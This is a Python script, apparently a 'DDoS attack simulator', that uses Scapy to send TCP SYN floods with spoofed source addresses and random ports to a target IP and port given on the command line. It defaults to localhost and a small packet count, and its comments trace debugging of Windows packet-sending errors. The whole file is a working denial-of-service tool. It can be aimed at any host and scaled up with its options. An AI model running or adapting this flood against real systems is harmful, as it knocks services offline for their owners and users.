import sys
import argparse
import time
import random
from scapy.all import IP, TCP, send

def simulate_syn_flood(target_ip, target_port, packet_count):
    print(f"Starting SYN flood on {target_ip}:{target_port} with {packet_count} packets...")
    
    try:
        for i in range(packet_count):
            # Create a packet with a random source IP (spoofing) and random source port
            # Note: Spoofing might be blocked by some networks/OS configurations
            # For local testing, we might just use the interface's IP or a fixed range
            src_ip = f"192.168.1.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            
            # Construct the packet
            # Use Layer 2 (Ether) for better compatibility on Windows/Npcap
            # 'ff:ff:ff:ff:ff:ff' is broadcast, or typically fine for local testing.
            # Localhost loopback on Windows Npcap can be tricky.
            # We will try 'send' (Layer 3) with a small fallback or just keep send() but ensure interface is picked?
            # The error 'L3pcapSocket object has no attribute send' suggests an issue with the conf.L3socket.
            
            # Alternative: Use "socket" manually or try "sendp" which uses L2socket.
            from scapy.all import Ether, sendp
            
            # For loopback on Windows, the MAC address might be relevant or not.
            # We'll stick to a simple Ether / IP / TCP stack.
            eth_layer = Ether()
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
            packet = eth_layer / ip_layer / tcp_layer
            
            # Send the packet at Layer 2
            # iface=None lets Scapy pick. 
            sendp(packet, verbose=0)
            
            if (i + 1) % 50 == 0:
                print(f"Sent {i + 1} packets...")
                
            # Minimal delay to allow some processing, although real attacks have 0 delay
            time.sleep(0.01)
            
        print(f"Attack simulation complete. Sent {packet_count} SYN packets.")
        
    except PermissionError:
        print("\n[ERROR] Permission denied. You need to run this script with sudo or as an administrator.")
        print("Scapy requires raw socket access to send crafted packets.")
    except Exception as e:
        print(f"\n[ERROR] An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Simulator (SYN Flood)")
    parser.add_argument("--target_ip", default="127.0.0.1", help="Target IP address")
    parser.add_argument("--target_port", type=int, default=80, help="Target port")
    parser.add_argument("--count", type=int, default=500, help="Number of packets to send")
    
    args = parser.parse_args()
    
    simulate_syn_flood(args.target_ip, args.target_port, args.count)
